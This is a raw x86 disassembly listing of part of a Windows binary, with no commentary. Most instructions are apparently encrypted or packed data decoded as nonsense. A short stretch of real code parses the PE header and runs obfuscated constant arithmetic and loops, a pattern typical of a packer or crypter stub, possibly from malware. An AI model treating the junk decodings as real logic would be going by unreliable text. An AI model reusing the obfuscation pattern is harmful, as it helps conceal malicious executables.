  41793e:	aas    
  41793f:	scas   eax,DWORD PTR es:[edi]
  417940:	dec    ebp
  417941:	dec    esi
  417942:	and    dh,BYTE PTR [eax-0x40]
  417945:	xor    bh,dl
  417947:	loope  0x417950
  417949:	cmc    
  41794a:	sub    BYTE PTR [ecx+0x1c],dl
  41794d:	cmp    al,0x9e
  41794f:	lahf   
  417950:	or     esi,ebp
  417952:	cld    
  417953:	xchg   BYTE PTR ds:0x2935450f,bl
  417959:	dec    esp
  41795a:	sub    bl,ah
  41795c:	add    al,0x78
  41795e:	dec    edi
  41795f:	push   ecx
  417960:	add    al,BYTE PTR [ebp-0x6e68af43]
  417966:	sub    edi,esi
  417968:	inc    eax
  417969:	int    0x9f
  41796b:	cli    
  41796c:	(bad)
  417970:	inc    ebx
  417971:	push   edi
  417972:	jmp    0x417983
  417974:	xchg   esp,eax
  417975:	outs   dx,DWORD PTR ds:[esi]
  417976:	cld    
  417977:	(bad)  
  417978:	xchg   BYTE PTR [eax],dh
  41797a:	or     eax,0xe584c722
  41797f:	lock mov esp,0x97f0547d
  417985:	push   es
  417986:	lods   al,BYTE PTR ds:[esi]
  417987:	(bad)  [edi-0x26f51f0f]
  41798d:	adc    ch,BYTE PTR [ecx]
  41798f:	lds    edx,FWORD PTR [esi+0xb94e8c7]
  417995:	jecxz  0x41797a
  417997:	push   ecx
  417998:	mov    bl,0x51
  41799a:	mov    ds:0x5c2437e,eax
  41799f:	dec    ebp
  4179a0:	dec    edi
  4179a1:	mov    WORD PTR [edi],gs
  4179a3:	pop    es
  4179a4:	adc    ecx,DWORD PTR [esi+0x280d3455]
  4179aa:	add    al,0x45
  4179ac:	loopne 0x417a0a
  4179ae:	jno    0x417a23
  4179b0:	imul   esp,DWORD PTR [esi-0x44],0xf3306a75
  4179b7:	pop    ecx
  4179b8:	jmp    0x9dc6:0xc1cc3885
  4179bf:	jge    0x417981
  4179c1:	lods   eax,DWORD PTR ds:[esi]
  4179c2:	xor    al,0xff
  4179c4:	int    0x69
  4179c6:	imul   ah
  4179c8:	push   0xe96228b1
  4179cd:	retf   
  4179ce:	cwde   
  4179cf:	outs   dx,DWORD PTR ds:[esi]
  4179d0:	sbb    edx,ebp
  4179d2:	dec    ebx
  4179d3:	call   0xe461:0xcf73a7cf
  4179da:	cli    
  4179db:	gs push ebx
  4179dd:	stc    
  4179de:	int3   
  4179df:	jge    0x4179c3
  4179e1:	mov    ebp,DWORD PTR [ebx+0x6deaacc0]
  4179e7:	cwde   
  4179e8:	rol    DWORD PTR [ebp-0x3c],cl
  4179eb:	and    eax,0xe7a0a05f
  4179f0:	aaa    
  4179f1:	mov    ecx,gs
  4179f3:	out    dx,eax
  4179f4:	mov    bl,0x12
  4179f6:	sub    al,0x8e
  4179f8:	sbb    ch,ch
  4179fa:	ins    BYTE PTR es:[edi],dx
  4179fb:	jmp    0x417a22
  4179fd:	stos   BYTE PTR es:[edi],al
  4179fe:	sbb    edi,DWORD PTR [ebx+0x4648e4e6]
  417a04:	cmp    eax,0x8ba6caf0
  417a09:	lods   eax,DWORD PTR ds:[esi]
  417a0a:	repz mov eax,0x8edd22b7
  417a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a11:	and    al,0xb5
  417a13:	repz in eax,dx
  417a15:	idiv   DWORD PTR [eax+0xdd151e1]
  417a1b:	loopne 0x417a6a
  417a1d:	popa   
  417a1e:	out    0x2e,al
  417a20:	inc    ebp
  417a21:	nop
  417a22:	test   al,0xfa
  417a24:	add    ah,cl
  417a26:	stos   DWORD PTR es:[edi],eax
  417a27:	lock cmp dh,BYTE PTR [edx]
  417a2a:	fadd   DWORD PTR [ecx]
  417a2c:	ins    BYTE PTR es:[edi],dx
  417a2d:	call   0x54ea:0x96f3655c
  417a34:	mov    eax,0x765d521d
  417a39:	cs ret 0x4c2c
  417a3d:	mov    al,ds:0xf541a60b
  417a42:	xchg   esp,eax
  417a43:	mov    bl,0xd5
  417a45:	cmp    ecx,DWORD PTR [edi+0x1acce58e]
  417a4b:	push   eax
  417a4c:	shl    al,1
  417a4e:	jmp    0xdfb49582
  417a53:	ret    
  417a54:	outs   dx,DWORD PTR ds:[esi]
  417a55:	add    BYTE PTR [ecx+0x54],dh
  417a58:	stos   DWORD PTR es:[edi],eax
  417a59:	sub    ebx,ebx
  417a5b:	mov    cl,0x1a
  417a5d:	in     eax,0x76
  417a5f:	sar    DWORD PTR [edi+0x58b4ccf5],1
  417a65:	dec    edi
  417a66:	mov    ds:0x2530abf8,al
  417a6b:	push   esi
  417a6c:	push   edx
  417a6d:	xchg   ebp,eax
  417a6e:	adc    cl,BYTE PTR [ecx]
  417a70:	add    ch,BYTE PTR [ebx]
  417a72:	pusha  
  417a73:	in     eax,0xf0
  417a75:	dec    esp
  417a76:	retf   
  417a77:	std    
  417a78:	setne  BYTE PTR [esp+esi*2+0x343ab9ac]
  417a80:	call   0x8de01d28
  417a85:	test   BYTE PTR [eax-0x308e073],ah
  417a8b:	push   esp
  417a8c:	sub    dh,al
  417a8e:	rol    DWORD PTR [ecx],1
  417a90:	fild   WORD PTR [esi]
  417a92:	mov    BYTE PTR [ecx+0x20],al
  417a95:	ss cmp eax,0x9b57dfb5
  417a9b:	pusha  
  417a9c:	mov    al,0x1b
  417a9e:	outs   dx,BYTE PTR ds:[esi]
  417a9f:	aaa    
  417aa0:	cmp    edx,DWORD PTR [ecx]
  417aa2:	fs push esp
  417aa4:	adc    al,0x9a
  417aa6:	scas   al,BYTE PTR es:[edi]
  417aa7:	and    eax,0x165b70be
  417aac:	test   BYTE PTR [ecx-0x252ff5b9],dl
  417ab2:	or     DWORD PTR [ecx],0x38
  417ab5:	ret    
  417ab6:	rcr    edi,0x53
  417ab9:	xlat   BYTE PTR ds:[ebx]
  417abb:	sbb    BYTE PTR [edx],ah
  417abd:	stc    
  417abe:	and    BYTE PTR [ecx+0x5e4f07c6],0x85
  417ac5:	call   0x7224:0x927b4134
  417acc:	std    
  417acd:	out    0x2e,al
  417acf:	sbb    ebx,edi
  417ad1:	(bad)  
  417ad2:	fs fs loopne 0x417aa3
  417ad6:	imul   esi,DWORD PTR [ecx-0x4c],0x7b
  417ada:	inc    edx
  417adb:	mov    esp,0x5ea85b7e
  417ae0:	in     eax,0x3b
  417ae2:	dec    ecx
  417ae3:	push   edi
  417ae4:	fisttp QWORD PTR [ebp-0x4c]
  417ae7:	pushf  
  417ae8:	out    dx,eax
  417ae9:	test   DWORD PTR [edx-0x6c],esi
  417aec:	dec    esp
  417aed:	dec    ecx
  417aee:	(bad)  
  417aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417af0:	and    ah,BYTE PTR [esi*8+0x6607a5db]
  417af7:	into   
  417af8:	mov    bl,BYTE PTR [edi-0x532ccaf6]
  417afe:	ja     0x417b59
  417b00:	out    0xb4,al
  417b02:	and    esp,edx
  417b04:	push   ecx
  417b05:	jo     0x417b1f
  417b07:	in     al,dx
  417b08:	fst    st(2)
  417b0a:	sbb    DWORD PTR [edx],0xffffffd7
  417b0d:	dec    edx
  417b0e:	mov    edi,0x503179e2
  417b13:	test   al,0x5d
  417b15:	fnsave [ebp+0x3b]
  417b18:	stos   BYTE PTR es:[edi],al
  417b19:	outs   dx,BYTE PTR ds:[esi]
  417b1a:	push   ebp
  417b1b:	mov    bl,0x3c
  417b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b1e:	shl    DWORD PTR [edi],cl
  417b20:	nop
  417b21:	xchg   dh,ch
  417b23:	loop   0x417ad5
  417b25:	push   ecx
  417b26:	mov    bl,0x81
  417b28:	pusha  
  417b29:	sbb    edx,edx
  417b2b:	pop    ss
  417b2c:	inc    edi
  417b2d:	pop    ss
  417b2e:	adc    ebx,ebp
  417b30:	arpl   WORD PTR [esi],cx
  417b32:	jb     0x417b74
  417b34:	jp     0x417ad9
  417b36:	out    0xfe,eax
  417b38:	pusha  
  417b39:	ret    0xc602
  417b3c:	retf   
  417b3d:	retf   
  417b3e:	or     BYTE PTR [eax+0x629c11b7],ch
  417b44:	es push 0x4a62fa3f
  417b4a:	mov    cl,0x1f
  417b4c:	cmp    DWORD PTR [ebx+eax*8],esi
  417b4f:	mov    ecx,0xb85fb9d7
  417b54:	test   BYTE PTR [edx],ch
  417b56:	or     al,0xee
  417b58:	xchg   edi,eax
  417b59:	or     DWORD PTR [edx-0x2b],0xffffff9d
  417b5d:	(bad)  
  417b5e:	xchg   BYTE PTR ss:0xdc8af132,al
  417b65:	dec    edi
  417b66:	pop    eax
  417b67:	xchg   ecx,eax
  417b68:	ror    DWORD PTR [edx+0x2e4eda64],0xde
  417b6f:	dec    ebx
  417b70:	inc    esp
  417b71:	inc    edi
  417b72:	xor    dl,0xa0
  417b75:	adc    ebp,eax
  417b77:	fild   DWORD PTR [eax]
  417b79:	cli    
  417b7a:	xor    al,0xc6
  417b7c:	cli    
  417b7d:	adc    dl,BYTE PTR [ecx+0x45]
  417b80:	cwde   
  417b81:	mov    al,0x55
  417b83:	stc    
  417b84:	and    dl,BYTE PTR [edi-0x7a]
  417b87:	(bad)  
  417b88:	rcr    ecx,cl
  417b8a:	lahf   
  417b8b:	outs   dx,DWORD PTR ds:[esi]
  417b8c:	jnp    0x417c00
  417b8e:	mov    eax,0x546ea84a
  417b93:	inc    edx
  417b94:	nop
  417b95:	mov    ds:0xca6f22f1,al
  417b9a:	xor    eax,0x69bbd85a
  417b9f:	ret    0x1908
  417ba2:	jg     0x417b8b
  417ba4:	jb     0x417c0a
  417ba6:	pop    eax
  417ba7:	popa   
  417ba8:	mov    ds:0x9a8154d0,eax
  417bad:	xchg   ebx,eax
  417bae:	rcr    DWORD PTR [esi+0x4c],cl
  417bb1:	adc    eax,DWORD PTR [ebx-0x6e]
  417bb4:	ja     0x417bd1
  417bb6:	jo     0x417c28
  417bb8:	aaa    
  417bb9:	pusha  
  417bba:	xor    dh,BYTE PTR [edi+eax*4]
  417bbd:	jmp    0x417b78
  417bbf:	sbb    al,0xdc
  417bc1:	(bad)  
  417bc2:	stc    
  417bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bc4:	dec    esp
  417bc5:	icebp  
  417bc6:	xor    DWORD PTR ds:0x83a79e95,0x66
  417bcd:	shr    BYTE PTR [ebp+0x2d441e93],1
  417bd3:	repnz inc esi
  417bd5:	or     eax,0x63f4d852
  417bda:	mov    al,0x76
  417bdc:	add    eax,0xfcca30c5
  417be1:	mov    esi,0x625c159
  417be6:	mov    dh,0x14
  417be8:	retf   0xd1a5
  417beb:	jmp    0x590bcb85
  417bf0:	sbb    eax,DWORD PTR [ebx+0x7cea922e]
  417bf6:	or     al,0xca
  417bf8:	jmp    0x10ad:0x4a4d86e4
  417bff:	(bad)
  417c02:	inc    edx
  417c03:	mov    ds,WORD PTR [edx+0x483f3b4d]
  417c09:	cmp    ecx,DWORD PTR [ecx]
  417c0b:	sbb    edx,ecx
  417c0d:	out    dx,eax
  417c0e:	es popf 
  417c10:	xor    DWORD PTR [esi+0x22],0xffffffa5
  417c14:	or     dh,BYTE PTR [edi+0x24]
  417c17:	hlt    
  417c18:	and    ebx,eax
  417c1a:	fcomp  QWORD PTR [ecx+0x5]
  417c1d:	cmp    edx,DWORD PTR [edx+0x53c09ad4]
  417c23:	rcl    eax,1
  417c25:	mov    al,ds:0x750d77ff
  417c2a:	pop    eax
  417c2b:	cwde   
  417c2c:	cmc    
  417c2d:	xlat   BYTE PTR ds:[ebx]
  417c2e:	sub    BYTE PTR [eax+0x50],ah
  417c31:	int    0x50
  417c33:	retf   
  417c34:	xchg   edx,eax
  417c35:	(bad)  
  417c36:	inc    DWORD PTR [esi+0x35ffe08]
  417c3c:	add    eax,0x75fcb29e
  417c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c42:	daa    
  417c43:	in     al,0x9a
  417c45:	(bad)  
  417c46:	lods   al,BYTE PTR ds:[esi]
  417c47:	mov    ds,WORD PTR fs:[ecx-0x5c614b6c]
  417c4e:	ds cmc 
  417c50:	jg     0x417c75
  417c52:	sahf   
  417c53:	xor    BYTE PTR [ebx+0x3fea956d],ch
  417c59:	mov    DWORD PTR [edx+0x16cb8b6e],esi
  417c5f:	push   ebp
  417c60:	mov    ds:0x38a7d950,eax
  417c65:	xor    DWORD PTR [eax-0x78],esi
  417c68:	xor    ecx,DWORD PTR [ecx+0x37]
  417c6b:	fnsave [edi]
  417c6d:	push   ss
  417c6e:	repz pop esi
  417c70:	fcomp  DWORD PTR ds:0xbaedbf35
  417c76:	push   0x72743f2b
  417c7b:	mov    al,ds:0xb98dcb3a
  417c80:	jle    0x417c3f
  417c82:	xchg   ecx,eax
  417c83:	mov    edx,0x1e5c499b
  417c88:	sub    cl,BYTE PTR fs:[edi]
  417c8b:	in     eax,0x1a
  417c8d:	push   edx
  417c8e:	jo     0x417cb0
  417c90:	jns    0x417cf0
  417c92:	xchg   ecx,eax
  417c93:	fistp  QWORD PTR [eax]
  417c95:	fbstp  TBYTE PTR [ecx-0x2f]
  417c98:	sub    DWORD PTR ds:0xc7f02391,edi
  417c9e:	imul   esp,DWORD PTR [esi-0x1a5a424f],0xa4145a13
  417ca8:	hlt    
  417ca9:	cld    
  417caa:	jmp    0x385b2102
  417caf:	cmc    
  417cb0:	mov    ebp,0xca39c90c
  417cb5:	jmp    0x417c8e
  417cb7:	push   edx
  417cb8:	nop
  417cb9:	push   0x46
  417cbb:	fldenv [eax]
  417cbd:	jbe    0x417d23
  417cbf:	retf   
  417cc0:	lods   al,BYTE PTR ds:[esi]
  417cc1:	out    dx,eax
  417cc2:	fbld   TBYTE PTR [eax+0x7e]
  417cc5:	push   0xc0892f8
  417cca:	or     al,0x18
  417ccc:	outs   dx,BYTE PTR ds:[esi]
  417ccd:	pusha  
  417cce:	rcr    ch,cl
  417cd0:	bound  ecx,QWORD PTR [edi+0x6dacaae3]
  417cd6:	or     DWORD PTR [ebx-0x2a],ebx
  417cd9:	addr16 jge 0x417cae
  417cdc:	push   esi
  417cdd:	push   ds
  417cde:	jnp    0x417cee
  417ce0:	add    BYTE PTR [edx-0x6a],bl
  417ce3:	cmp    al,0x70
  417ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ce6:	mov    ah,0x5c
  417ce8:	mov    ecx,0xd579bb27
  417ced:	push   0x66
  417cef:	cmp    ch,al
  417cf1:	(bad)  [eax+edi*2]
  417cf4:	jmp    0x5220e4e3
  417cf9:	xlat   BYTE PTR ds:[ebx]
  417cfa:	add    BYTE PTR [esi],cl
  417cfc:	test   BYTE PTR [ecx-0x7d7c7778],0xce
  417d03:	dec    ebx
  417d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d05:	into   
  417d06:	in     eax,0x35
  417d08:	inc    ecx
  417d09:	mov    ds:0xc8388871,al
  417d0e:	cwde   
  417d0f:	pop    ebp
  417d10:	test   edx,esp
  417d12:	sbb    DWORD PTR [esi+0x37],edx
  417d15:	fist   DWORD PTR [esi+0x46]
  417d18:	inc    ebx
  417d19:	add    al,0x55
  417d1b:	arpl   bp,si
  417d1d:	add    BYTE PTR [eax-0x69e0c6b8],al
  417d23:	mov    edx,0xab9bfff
  417d28:	scas   al,BYTE PTR es:[edi]
  417d29:	(bad)  
  417d2a:	adc    bh,BYTE PTR [eax+0x437d8afb]
  417d30:	cmc    
  417d31:	or     al,0xc5
  417d33:	mov    dh,0xca
  417d35:	sub    ecx,DWORD PTR [ebx+0x20]
  417d38:	nop
  417d39:	hlt    
  417d3a:	add    esi,DWORD PTR [edx-0x3e818833]
  417d40:	mov    DWORD PTR [ebx+0x4ff969b],0x3eb5681c
  417d4a:	popf   
  417d4b:	ror    ecx,0x39
  417d4e:	inc    ebx
  417d4f:	and    DWORD PTR [ebp-0xd],0xffffffc8
  417d53:	test   BYTE PTR [esi+esi*8+0x71],al
  417d57:	jg     0x417d4a
  417d59:	aad    0xe0
  417d5b:	daa    
  417d5c:	push   edx
  417d5d:	bound  esi,QWORD PTR [eax+edi*1+0x51]
  417d61:	adc    DWORD PTR [edx+0x2a],0x574e55dd
  417d68:	dec    ebx
  417d69:	pop    esp
  417d6a:	push   0xffffff91
  417d6c:	push   ds
  417d6d:	inc    ecx
  417d6e:	cmp    al,0x5d
  417d70:	jp     0x417de1
  417d72:	cmp    BYTE PTR [edx+0x7f51fcc2],bh
  417d78:	inc    ecx
  417d79:	mov    cs:0x27f303b9,eax
  417d7f:	test   eax,0x72d0e092
  417d84:	pusha  
  417d85:	mov    DWORD PTR [ebp+eax*2+0x5e45b7bb],edi
  417d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d8d:	sub    eax,ecx
  417d8f:	cli    
  417d90:	leave  
  417d91:	jbe    0x417d2f
  417d93:	inc    ecx
  417d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d95:	mov    esi,DWORD PTR [edi]
  417d97:	adc    BYTE PTR [ebx-0x43],dh
  417d9a:	pop    edx
  417d9b:	add    edi,DWORD PTR [edi-0x30]
  417d9e:	jne    0x417d5c
  417da0:	mov    dh,0x6f
  417da2:	or     eax,0xa8bebaaf
  417da7:	push   ds
  417da8:	xchg   BYTE PTR [esi+eiz*2+0x38c540ea],bh
  417daf:	adc    DWORD PTR [ebx-0x50],ebp
  417db2:	call   DWORD PTR ds:0xab27363f
  417db8:	loop   0x417d94
  417dba:	cmp    eax,0x1ab36ff7
  417dbf:	iret   
  417dc0:	ja     0x417d9f
  417dc2:	retf   
  417dc3:	pop    ecx
  417dc4:	clc    
  417dc5:	mov    BYTE PTR [edx+0x21041a83],0xfa
  417dcc:	inc    esp
  417dcd:	cmp    eax,0x291f4826
  417dd2:	or     al,0x52
  417dd4:	sbb    ecx,DWORD PTR [ebp+0x1e]
  417dd7:	mov    ebp,esi
  417dd9:	popf   
  417dda:	into   
  417ddb:	test   eax,0xdac43762
  417de0:	das    
  417de1:	aam    0xf9
  417de3:	or     edi,DWORD PTR [edx-0x21d9ba3f]
  417de9:	push   0xdb2afc34
  417dee:	ss sar edi,1
  417df1:	sub    DWORD PTR [ecx+0x78],ecx
  417df4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417df5:	ja     0x417d9f
  417df7:	xor    eax,0xf9d848db
  417dfc:	sub    esi,esp
  417dfe:	addr16 mov bl,0xe2
  417e01:	mov    ebp,0x41ec576f
  417e06:	adc    esi,edi
  417e08:	xchg   esp,eax
  417e09:	nop
  417e0a:	test   BYTE PTR [ebx-0x686bb1f2],bh
  417e10:	dec    esp
  417e11:	adc    esp,esi
  417e13:	sub    eax,0x9c88e5f8
  417e18:	adc    DWORD PTR [esi+ecx*8+0x6a45776e],0x36e7fc3b
  417e23:	or     DWORD PTR [esi],ebx
  417e25:	push   cs
  417e26:	retf   
  417e27:	inc    eax
  417e28:	jle    0x417e82
  417e2a:	lahf   
  417e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e2c:	cmc    
  417e2d:	test   eax,0x25d93156
  417e32:	push   ss
  417e33:	add    eax,DWORD PTR [esi-0x5a658029]
  417e39:	mov    dh,0x9d
  417e3b:	gs pop es
  417e3d:	gs mov dl,bl
  417e40:	pop    ds
  417e41:	and    dl,al
  417e43:	nop
  417e44:	data16 neg BYTE PTR [edx]
  417e47:	ds jns 0x417e55
  417e4a:	add    eax,0x209679c
  417e4f:	jno    0x417e59
  417e51:	xor    dl,bl
  417e53:	xor    al,0xf8
  417e55:	jns    0x417dfc
  417e57:	mov    esp,0x2000db20
  417e5c:	ror    dl,cl
  417e5e:	inc    ebx
  417e5f:	cli    
  417e60:	out    0xee,eax
  417e62:	(bad)  
  417e63:	xchg   edi,eax
  417e64:	inc    ebp
  417e65:	ss jnp 0x417e4a
  417e68:	mov    ds:0xe3fe8eb2,al
  417e6d:	jbe    0x417e23
  417e6f:	fmul   DWORD PTR [ebp-0xd]
  417e72:	and    eax,0xb92be010
  417e77:	jne    0x417e27
  417e79:	ret    0xc8d8
  417e7c:	mov    edx,0xe2892eda
  417e81:	dec    edi
  417e82:	inc    ecx
  417e83:	or     dh,al
  417e85:	int    0xf6
  417e87:	fsubp  st(7),st
  417e89:	xchg   edx,eax
  417e8a:	mov    esi,DWORD PTR [esi+0x630a7b6]
  417e90:	sub    DWORD PTR [ebx+0x71],esi
  417e93:	adc    edx,DWORD PTR [ebp*2-0x41f3cbe7]
  417e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e9b:	cmc    
  417e9c:	xchg   BYTE PTR [eax],ah
  417e9e:	shl    BYTE PTR [eax],cl
  417ea0:	arpl   WORD PTR [esi-0x7123f4d6],cx
  417ea6:	mov    DWORD PTR [esi-0x25],ebx
  417ea9:	pop    ds
  417eaa:	mov    ds:0x3aebee5a,al
  417eaf:	pop    ebp
  417eb0:	iret   
  417eb1:	or     dh,ah
  417eb3:	adc    DWORD PTR [eax+0x7a],edx
  417eb6:	or     BYTE PTR [edi+ecx*8+0xc],al
  417eba:	push   edx
  417ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ebc:	imul   ebx,DWORD PTR [ecx-0x3c],0x5eed8b08
  417ec3:	sbb    DWORD PTR [ecx],0x70
  417ec6:	inc    ebp
  417ec7:	push   edx
  417ec8:	sbb    al,0xfb
  417eca:	loopne 0x417e8b
  417ecc:	aaa    
  417ecd:	lock mov edi,0x1e26a219
  417ed3:	xchg   ebp,eax
  417ed4:	mov    esi,0x25ea34b4
  417ed9:	jle    0x417f3f
  417edb:	adc    DWORD PTR [edx-0xcc2e6b7],edx
  417ee1:	jl     0x417ea5
  417ee3:	add    esp,DWORD PTR ds:0x59a28fdd
  417ee9:	push   eax
  417eea:	mov    eax,0x9d72bc74
  417eef:	repz loop 0x417ea7
  417ef2:	loopne 0x417f0e
  417ef4:	pop    ss
  417ef5:	inc    edi
  417ef6:	arpl   WORD PTR [esi+0x48dd17d3],di
  417efc:	ins    DWORD PTR es:[edi],dx
  417efd:	jno    0x417e86
  417eff:	xchg   ebp,eax
  417f00:	out    dx,eax
  417f01:	test   DWORD PTR [eax+0x50],edx
  417f04:	lods   al,BYTE PTR ds:[esi]
  417f05:	aad    0xa0
  417f07:	enter  0xa8c0,0xdf
  417f0b:	mov    al,0x7d
  417f0d:	sub    eax,0xb458bfa4
  417f12:	in     eax,0x22
  417f14:	mov    ah,ah
  417f16:	lock test eax,0x7b66e127
  417f1c:	xor    DWORD PTR [ebx],ebx
  417f1e:	js     0x417f75
  417f20:	mov    BYTE PTR [esi+0x27],dh
  417f23:	jnp    0x417eaf
  417f25:	add    BYTE PTR [ecx+0x42900405],al
  417f2b:	add    BYTE PTR [esi+0x24],cl
  417f2e:	add    BYTE PTR [eax],al
  417f30:	add    al,0xd
  417f32:	xor    DWORD PTR ds:0x429014,0x42600c
  417f3c:	xor    al,0x6f
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42004b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d1dc
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	arpl   WORD PTR ds:0x24fdf023,dx
  418119:	popa   
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx+0x3d]
  418120:	shl    BYTE PTR ss:[eax],0x36
  418124:	retf   
  418125:	imul   ebp,DWORD PTR [ebx+edx*1-0x4ae6cd9e],0x6dda870c
  418130:	lods   al,BYTE PTR ds:[esi]
  418131:	(bad)  
  418132:	fyl2x  
  418134:	(bad)  
  418135:	bound  di,DWORD PTR [eax+0x3dccbf2c]
  41813c:	pop    edi
  41813d:	pop    ebx
  41813e:	pop    esi
  41813f:	push   esp
  418140:	jmp    0x2f9f:0x17b7f12a
  418147:	nop
  418148:	fcmove st,st(0)
  41814a:	das    
  41814b:	mov    bl,0x77
  41814d:	pcmpgtw mm1,QWORD PTR [ebp+eiz*4+0x1d5a6e8e]
  418155:	mov    ah,0x6
  418157:	pop    ecx
  418158:	jl     0x41817a
  41815a:	push   ss
  41815b:	or     ah,BYTE PTR [eax+0x12]
  41815e:	sbb    ebp,eax
  418160:	ror    BYTE PTR [ecx+0x68d09726],cl
  418166:	mov    edi,0xbc91de23
  41816b:	xchg   ebx,eax
  41816c:	jae    0x4181dd
  41816e:	xor    ch,BYTE PTR ds:0xa5754d0d
  418174:	idiv   DWORD PTR [esi+esi*1+0x66]
  418178:	(bad)  
  418179:	add    al,0xab
  41817b:	(bad)  
  41817d:	push   DWORD PTR [ecx-0x51]
  418180:	popa   
  418181:	sbb    cl,cl
  418183:	int    0xbb
  418185:	jge    0x418137
  418187:	cmp    ebp,DWORD PTR [edi-0x74]
  41818a:	int3   
  41818b:	pop    edi
  41818c:	fyl2xp1 
  41818e:	sbb    DWORD PTR [ebx+esi*8+0x3cc4ca93],esp
  418195:	rep stos DWORD PTR es:[edi],eax
  418197:	mov    edi,0x672115e3
  41819c:	jmp    0x418135
  41819e:	and    eax,0xa5ab6a8d
  4181a3:	lods   eax,DWORD PTR ds:[esi]
  4181a4:	pusha  
  4181a5:	jmp    FWORD PTR [ebp+0x66]
  4181a8:	push   ecx
  4181a9:	fcomp  QWORD PTR [edi-0x6aa85e1f]
  4181af:	hlt    
  4181b0:	fwait
  4181b1:	or     al,0x88
